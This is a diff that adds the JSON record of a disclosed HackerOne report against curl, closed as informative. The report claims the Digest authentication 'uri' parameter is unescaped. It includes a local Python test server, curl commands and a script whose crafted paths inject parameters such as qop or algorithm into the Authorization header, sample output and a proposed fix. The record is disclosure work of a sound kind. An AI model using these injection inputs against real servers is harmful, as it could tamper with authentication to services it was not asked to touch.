@@ -1,0 +1,143 @@
+{
+  "id": 3508799,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTA4Nzk5",
+  "url": "https://hackerone.com/reports/3508799",
+  "title": "Digest Authentication Header Injection",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "low",
+  "readable_substate": "Informative",
+  "created_at": "2026-01-13T13:30:36.863Z",
+  "submitted_at": "2026-01-13T13:30:37.250Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "andrew-bbp",
+    "url": "/andrew-bbp",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-01-14T10:02:16.901Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-01-14T10:02:16.689Z",
+  "team_member_agreed_on_going_public_at": "2026-01-14T10:01:01.642Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nThe Digest authentication implementation in `libcurl` fails to properly escape the `uri` parameter in the `Authorization` header. While other parameters like `username`, `realm`, and `nonce` are correctly escaped using `auth_digest_string_quoted()`, the `uri` is inserted raw into the header. This allows an attacker who can control the request URI to inject additional parameters into the HTTP `Authorization` header, potentially bypassing security controls or causing protocol confusion.\n\n## Affected Component\n- **File:** `lib/vauth/digest.c`\n- **Function:** `auth_create_digest_http_message`\n- **Lines:** 867-897\n\n## Vulnerability Details\n\n### Root Cause\nIn `lib/vauth/digest.c`, the Digest authentication response is constructed using `curl_maprintf`. The function properly escapes most parameters but fails to escape the `uri` parameter:\n\n```c\n/* lib/vauth/digest.c:867-882 */\nif(digest->qop) {\n  response = curl_maprintf(\"username=\\\"%s\\\", \"\n                           \"realm=\\\"%s\\\", \"\n                           \"nonce=\\\"%s\\\", \"\n                           \"uri=\\\"%s\\\", \"      // <- VULNERABLE: uri not escaped\n                           \"cnonce=\\\"%s\\\", \"\n                           \"nc=%08x, \"\n                           \"qop=%s, \"\n                           \"response=\\\"%s\\\"\",\n                           userp_quoted,       // <- username IS escaped\n                           realm_quoted,       // <- realm IS escaped\n                           nonce_quoted,       // <- nonce IS escaped\n                           uripath,            // <- uri NOT escaped\n                           digest->cnonce,\n                           digest->nc,\n                           digest->qop,\n                           request_digest);\n}\n```\n\nCompare this to how `username` is handled:\n\n```c\n/* lib/vauth/digest.c:835-843 */\nuserp_quoted = auth_digest_string_quoted(userp);\nif(!userp_quoted)\n  return CURLE_OUT_OF_MEMORY;\n```\n\nThe `auth_digest_string_quoted()` function (lines 151-180) properly escapes double quotes and backslashes:\n\n```c\nstatic char *auth_digest_string_quoted(const char *source)\n{\n  char *dest;\n  const char *s = source;\n  size_t n = 1; /* null-terminator */\n  \n  /* Calculate size needed */\n  while(*s) {\n    ++n;\n    if(*s == '\"' || *s == '\\\\') {\n      ++n;  // Need extra byte for escape character\n    }\n    ++s;\n  }\n  \n  dest = curlx_malloc(n);\n  if(dest) {\n    char *d = dest;\n    s = source;\n    while(*s) {\n      if(*s == '\"' || *s == '\\\\') {\n        *d++ = '\\\\';  // Add escape character\n      }\n      *d++ = *s++;\n    }\n    *d = '\\0';\n  }\n  \n  return dest;\n}\n```\n\n### Attack Mechanism\nIf an attacker can control the URI path to include a double quote character, they can:\n1. Terminate the `uri` field early\n2. Inject arbitrary parameters into the Digest header\n3. Potentially override security-critical parameters like `qop` or `algorithm`\n\n## Proof of Concept\n\n### Prerequisites\n- curl with Digest authentication support\n- Python 3.x for the test server\n\n### Step 1: Create the Test Server\n\nSave this as `digest_server.py`:\n\n```python\n\nimport socket\nimport threading\nimport time\n\ndef start_server(port=8081):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind(('127.0.0.1', port))\n    s.listen(1)\n    print(f\"[*] Digest test server listening on port {port}\")\n    \n    while True:\n        try:\n            conn, addr = s.accept()\n            data = conn.recv(4096).decode('utf-8', errors='replace')\n            \n            if \"Authorization: Digest\" not in data:\n                # Send 401 challenge\n                response = (\n                    \"HTTP/1.1 401 Unauthorized\\r\\n\"\n                    \"WWW-Authenticate: Digest realm=\\\"test\\\", \"\n                    \"nonce=\\\"dcd98b7102dd2f0e8b11d0f600bfb0c093\\\", \"\n                    \"qop=\\\"auth\\\"\\r\\n\"\n                    \"Content-Length: 0\\r\\n\"\n                    \"\\r\\n\"\n                )\n                conn.sendall(response.encode())\n                print(\"[*] Sent 401 challenge\")\n            else:\n                # Extract and display Authorization header\n                print(\"\\n=== RECEIVED REQUEST ===\")\n                for line in data.split('\\r\\n'):\n                    if line.startswith('Authorization:'):\n                        print(f\"\\n{line}\\n\")\n                        \n                        # Highlight the injection\n                        if 'injected=' in line:\n                            print(\"[!] INJECTION DETECTED!\")\n                            print(\"[!] The 'injected' parameter should NOT be in the header\")\n                \n                # Send 200 OK\n                response = \"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nOK\"\n                conn.sendall(response.encode())\n                \n            conn.close()\n        except Exception as e:\n            print(f\"[-] Error: {e}\")\n\nif __name__ == \"__main__\":\n    start_server()\n```\n\n### Step 2: Start the Server\n\n```bash\npython digest_server.py\n```\n\n### Step 3: Execute the Attack\n\nIn another terminal, run curl with a malicious path containing a double quote:\n\n```bash\ncurl -v --path-as-is --digest 'http://user:pass@127.0.0.1:8081/index.html\",injected=\"true'\n```\n\n**Important:** The `--path-as-is` flag is required to prevent curl from normalizing the path.\n\n### Step 4: Observe the Result\n\nThe server will display output similar to:\n\n```\n[*] Sent 401 challenge\n\n=== RECEIVED REQUEST ===\n\nAuthorization: Digest username=\"user\",realm=\"test\",nonce=\"dcd98b7102dd2f0e8b11d0f600bfb0c093\",uri=\"/index.html\",injected=\"true\",cnonce=\"NjE3ZjJkMzQwYzQyMQ==\",nc=00000001,response=\"6629fae49393a05397450978507c4ef1\",qop=\"auth\"\n\n[!] INJECTION DETECTED!\n[!] The 'injected' parameter should NOT be in the header\n```\n\n### Analysis of the Injected Header\n\nThe malicious path `/index.html\",injected=\"true` causes the following header structure:\n\n```\nuri=\"/index.html\",injected=\"true\"\n```\n\nInstead of the expected:\n\n```\nuri=\"/index.html\\\",injected=\\\"true\"\n```\n\nThis demonstrates that:\n1. The double quote in the path terminates the `uri` field\n2. The attacker-controlled string `injected=\"true\"` is inserted as a new parameter\n3. The Digest authentication header is now malformed with an injected parameter\n\n### Alternative PoC (Python Script)\n\n```python\nimport subprocess\n\n# Malicious URL with quote injection\nurl = 'http://user:pass@127.0.0.1:8081/index.html\",injected=\"true'\n\n# Execute curl\ncmd = ['curl', '-v', '--path-as-is', '--digest', url]\nresult = subprocess.run(cmd, capture_output=True, text=True)\n\nprint(\"=== STDERR (includes headers) ===\")\nprint(result.stderr)\n\n# Look for the injection\nif 'injected=\"true\"' in result.stderr:\n    print(\"\\n[!] VULNERABILITY CONFIRMED\")\n    print(\"[!] The injected parameter appears in the Authorization header\")\nelse:\n    print(\"\\n[*] Injection not detected in output\")\n```\n\n## Impact\n\n## Impact\n\n### Security Implications\n\n1. **Authentication Parameter Manipulation**\n   - Attacker can inject `qop=\"none\"` to downgrade authentication\n   - Inject `algorithm=\"MD5\"` to force weaker algorithms\n   - Add custom parameters that might confuse proxies or servers\n\n2. **Protocol Confusion**\n   - Malformed headers may cause different parsing by intermediaries\n   - Could lead to request smuggling in certain proxy configurations\n\n3. **Cache Poisoning**\n   - Injected parameters might affect cache keys\n   - Could lead to serving wrong content to users\n\n4. **Logging and Monitoring Bypass**\n   - Security tools parsing the header may be confused\n   - Injected parameters might not be logged correctly\n\n### Attack Scenarios\n\n**Scenario 1: QoP Downgrade**\n```bash\ncurl --digest 'http://user:pass@target.com/path\",qop=\"none'\n```\nResult: `uri=\"/path\",qop=\"none\",cnonce=...` - potentially downgrades authentication\n\n**Scenario 2: Algorithm Manipulation**\n```bash\ncurl --digest 'http://user:pass@target.com/path\",algorithm=\"MD5'\n```\nResult: Forces MD5 algorithm even if server supports stronger options\n\n## Recommendation\n\n### Fix\nUpdate `lib/vauth/digest.c` to escape the `uri` parameter using `auth_digest_string_quoted()`:\n\n```c\n/* lib/vauth/digest.c - FIXED VERSION */\n\n// Add this before constructing the response\nchar *uri_quoted = auth_digest_string_quoted(uripath);\nif(!uri_quoted) {\n  curlx_free(nonce_quoted);\n  curlx_free(realm_quoted);\n  curlx_free(userp_quoted);\n  return CURLE_OUT_OF_MEMORY;\n}\n\nif(digest->qop) {\n  response = curl_maprintf(\"username=\\\"%s\\\", \"\n                           \"realm=\\\"%s\\\", \"\n                           \"nonce=\\\"%s\\\", \"\n                           \"uri=\\\"%s\\\", \"      // Now using escaped version\n                           \"cnonce=\\\"%s\\\", \"\n                           \"nc=%08x, \"\n                           \"qop=%s, \"\n                           \"response=\\\"%s\\\"\",\n                           userp_quoted,\n                           realm_quoted,\n                           nonce_quoted,\n                           uri_quoted,         // <- FIXED: using escaped uri\n                           digest->cnonce,\n                           digest->nc,\n                           digest->qop,\n                           request_digest);\n}\n\n// Don't forget to free\ncurlx_free(uri_quoted);\n```\n\n### Verification\nAfter applying the fix, the PoC should result in a properly escaped header:\n\n```\nuri=\"/index.html\\\",injected=\\\"true\"\n```\n\nThe double quotes will be escaped and the injection will fail.",
+  "weakness": {
+    "id": 1,
+    "name": "HTTP Response Splitting"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5220921,
+      "file_name": "digest_poc_client.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cpzn9wbt29w2c8mwd79yiz8gs1jf?response-content-disposition=attachment%3B%20filename%3D%22digest_poc_client.py%22%3B%20filename%2A%3DUTF-8%27%27digest_poc_client.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV2I7C47M%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T193943Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCIj68hpPtc9OPN4eK08isaT2yhnAE9j4g7%2BlrVKCPwmwIgbory0DHEjZrfboZ2OJYgRJUGYTRSyAdf8foMDhrdrCMquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNa%2BUUVfVHa4J7owXSqPBctWuIOVhHbhWJLcWVBlZbPs3Q%2FZXOzyJ91N6nAxnyT%2BMcvKHDFvaulWp3dSVsvuXIZY6R61cKHjRRjC1qrpLP4F3T4gadqocP%2FNDARZEkVoYNpMEY4RpxqPfgyt5YhecQL6QjgDdp4dH18Vhyyf2pdvo6bB4aJwpbJ0U4j4uVxclZRBKj4W8ks1YnXj4obXcVMpl2zKJXHB1dcgHYissoSyYyXwiU4GrKu5TTK0Kd6CJzPsR6%2Bov0XpbAWUZSxYgeskbPsenxI4nWLWR9xTbzc%2Fiu212tftg9n2yp8pAqLyaM2sObCw0LWeJLKnqh4KbIawHcI6TZgqSDZzIRpNI%2BPUUeHGQbYKA6XZ2MdT3NZEljHl%2BB0%2Fqq%2B7VpVniIyKKnqosOQul3iNcXnSD9y1zfbEDueZUBv2wUIKr%2F9BV%2B1dYRtD9%2B5d4gk2rc5pgOhT3K59VqIzzw1bA%2BwF%2FigTM8DpbwH8njuwrlzurf9UIeRws9n%2BEzL2mxn%2FwC73nxuPFFUXEfz2DT5DC3R%2FU7E%2BROGdaM%2FX6hB7rTNG35Dk%2Blm6pIRYMq3bhK%2F55kbPRv9QeNw3hPklVng4ys5upjm6ADAlZ82lBE9GwbgxDhlDw9gQhdMBKMtnncp3wmX9g79Kzj6dBoijESxtkKeDIX8De7XZmuaTnbWss6x%2BXOP1hUQT%2BYbDhg9YAcaYLGoSTosaetkxb0K7Q%2FVyqSmDriKgql%2Be9XOR2RCp1Z0RP6LbvAdTPIwly72RMtNUZxSOV0sbnLWqT9AAyFvDI8BdCBo34CVWkZfhg5e4C5m7lZSXToiA5LHIN66tsL9ZOb%2Fy%2BJmrv%2FD%2FrDRSscdFztYbxPez2sQUXFGVZs9yXLy%2Fev1cmB4w5bjizAY6sQErIM2jbwhyfAK6rrrYH%2BedgwDQqaFLCA2ZOWiYrntThLkOJ85Cxj4%2FfQBuM96AZ4RIMOwCfVrNyXqGNJ8Q85aMWD1Zb%2Bult28xjXP2kJ%2B7ktDSzHsVT71wV39ZD%2FlGH8%2FWe3NXekHrxP2nVkRebMRt0zmviELNQ7tJLUFFCAgycfUbSAeu8nYZ047y2OXCMws6LKiFYnYrNMkJJcf1t1%2FY4zuS9wgcPAf9oEtuQC%2B2opk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8297dd3e1431594fd4b81bd933e4e38db4928977db84f54ef5f3728bb72e550b",
+      "file_size": 2334,
+      "type": "text/x-python",
+      "moderated": null
+    },
+    {
+      "id": 5220922,
+      "file_name": "digest_poc_server.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z9axpvsui2txdcr2103u0s2dn365?response-content-disposition=attachment%3B%20filename%3D%22digest_poc_server.py%22%3B%20filename%2A%3DUTF-8%27%27digest_poc_server.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV2I7C47M%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T193943Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCIj68hpPtc9OPN4eK08isaT2yhnAE9j4g7%2BlrVKCPwmwIgbory0DHEjZrfboZ2OJYgRJUGYTRSyAdf8foMDhrdrCMquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNa%2BUUVfVHa4J7owXSqPBctWuIOVhHbhWJLcWVBlZbPs3Q%2FZXOzyJ91N6nAxnyT%2BMcvKHDFvaulWp3dSVsvuXIZY6R61cKHjRRjC1qrpLP4F3T4gadqocP%2FNDARZEkVoYNpMEY4RpxqPfgyt5YhecQL6QjgDdp4dH18Vhyyf2pdvo6bB4aJwpbJ0U4j4uVxclZRBKj4W8ks1YnXj4obXcVMpl2zKJXHB1dcgHYissoSyYyXwiU4GrKu5TTK0Kd6CJzPsR6%2Bov0XpbAWUZSxYgeskbPsenxI4nWLWR9xTbzc%2Fiu212tftg9n2yp8pAqLyaM2sObCw0LWeJLKnqh4KbIawHcI6TZgqSDZzIRpNI%2BPUUeHGQbYKA6XZ2MdT3NZEljHl%2BB0%2Fqq%2B7VpVniIyKKnqosOQul3iNcXnSD9y1zfbEDueZUBv2wUIKr%2F9BV%2B1dYRtD9%2B5d4gk2rc5pgOhT3K59VqIzzw1bA%2BwF%2FigTM8DpbwH8njuwrlzurf9UIeRws9n%2BEzL2mxn%2FwC73nxuPFFUXEfz2DT5DC3R%2FU7E%2BROGdaM%2FX6hB7rTNG35Dk%2Blm6pIRYMq3bhK%2F55kbPRv9QeNw3hPklVng4ys5upjm6ADAlZ82lBE9GwbgxDhlDw9gQhdMBKMtnncp3wmX9g79Kzj6dBoijESxtkKeDIX8De7XZmuaTnbWss6x%2BXOP1hUQT%2BYbDhg9YAcaYLGoSTosaetkxb0K7Q%2FVyqSmDriKgql%2Be9XOR2RCp1Z0RP6LbvAdTPIwly72RMtNUZxSOV0sbnLWqT9AAyFvDI8BdCBo34CVWkZfhg5e4C5m7lZSXToiA5LHIN66tsL9ZOb%2Fy%2BJmrv%2FD%2FrDRSscdFztYbxPez2sQUXFGVZs9yXLy%2Fev1cmB4w5bjizAY6sQErIM2jbwhyfAK6rrrYH%2BedgwDQqaFLCA2ZOWiYrntThLkOJ85Cxj4%2FfQBuM96AZ4RIMOwCfVrNyXqGNJ8Q85aMWD1Zb%2Bult28xjXP2kJ%2B7ktDSzHsVT71wV39ZD%2FlGH8%2FWe3NXekHrxP2nVkRebMRt0zmviELNQ7tJLUFFCAgycfUbSAeu8nYZ047y2OXCMws6LKiFYnYrNMkJJcf1t1%2FY4zuS9wgcPAf9oEtuQC%2B2opk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d5248fd5dad112614583f1c4007be4418a623ac39071706e283d0a04a19fefcf",
+      "file_size": 3385,
+      "type": "text/x-python",
+      "moderated": null
+    },
+    {
+      "id": 5220923,
+      "file_name": "digest.webm",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/szr4d6x5x06v8uhklc6mqb0rcbap?response-content-disposition=attachment%3B%20filename%3D%22digest.webm%22%3B%20filename%2A%3DUTF-8%27%27digest.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV2I7C47M%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T193943Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCIj68hpPtc9OPN4eK08isaT2yhnAE9j4g7%2BlrVKCPwmwIgbory0DHEjZrfboZ2OJYgRJUGYTRSyAdf8foMDhrdrCMquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNa%2BUUVfVHa4J7owXSqPBctWuIOVhHbhWJLcWVBlZbPs3Q%2FZXOzyJ91N6nAxnyT%2BMcvKHDFvaulWp3dSVsvuXIZY6R61cKHjRRjC1qrpLP4F3T4gadqocP%2FNDARZEkVoYNpMEY4RpxqPfgyt5YhecQL6QjgDdp4dH18Vhyyf2pdvo6bB4aJwpbJ0U4j4uVxclZRBKj4W8ks1YnXj4obXcVMpl2zKJXHB1dcgHYissoSyYyXwiU4GrKu5TTK0Kd6CJzPsR6%2Bov0XpbAWUZSxYgeskbPsenxI4nWLWR9xTbzc%2Fiu212tftg9n2yp8pAqLyaM2sObCw0LWeJLKnqh4KbIawHcI6TZgqSDZzIRpNI%2BPUUeHGQbYKA6XZ2MdT3NZEljHl%2BB0%2Fqq%2B7VpVniIyKKnqosOQul3iNcXnSD9y1zfbEDueZUBv2wUIKr%2F9BV%2B1dYRtD9%2B5d4gk2rc5pgOhT3K59VqIzzw1bA%2BwF%2FigTM8DpbwH8njuwrlzurf9UIeRws9n%2BEzL2mxn%2FwC73nxuPFFUXEfz2DT5DC3R%2FU7E%2BROGdaM%2FX6hB7rTNG35Dk%2Blm6pIRYMq3bhK%2F55kbPRv9QeNw3hPklVng4ys5upjm6ADAlZ82lBE9GwbgxDhlDw9gQhdMBKMtnncp3wmX9g79Kzj6dBoijESxtkKeDIX8De7XZmuaTnbWss6x%2BXOP1hUQT%2BYbDhg9YAcaYLGoSTosaetkxb0K7Q%2FVyqSmDriKgql%2Be9XOR2RCp1Z0RP6LbvAdTPIwly72RMtNUZxSOV0sbnLWqT9AAyFvDI8BdCBo34CVWkZfhg5e4C5m7lZSXToiA5LHIN66tsL9ZOb%2Fy%2BJmrv%2FD%2FrDRSscdFztYbxPez2sQUXFGVZs9yXLy%2Fev1cmB4w5bjizAY6sQErIM2jbwhyfAK6rrrYH%2BedgwDQqaFLCA2ZOWiYrntThLkOJ85Cxj4%2FfQBuM96AZ4RIMOwCfVrNyXqGNJ8Q85aMWD1Zb%2Bult28xjXP2kJ%2B7ktDSzHsVT71wV39ZD%2FlGH8%2FWe3NXekHrxP2nVkRebMRt0zmviELNQ7tJLUFFCAgycfUbSAeu8nYZ047y2OXCMws6LKiFYnYrNMkJJcf1t1%2FY4zuS9wgcPAf9oEtuQC%2B2opk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8318caac3b864318e2ec0b644a7db8006bcd901e218b538db99f05025d7c3494",
+      "file_size": 4365458,
+      "type": "video/webm",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "regex-33",
+    "2026",
+    "mr-inspector",
+    "andrew-bbp",
+    "jonnywalk1",
+    "hunta",
+    "stationarydev37"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
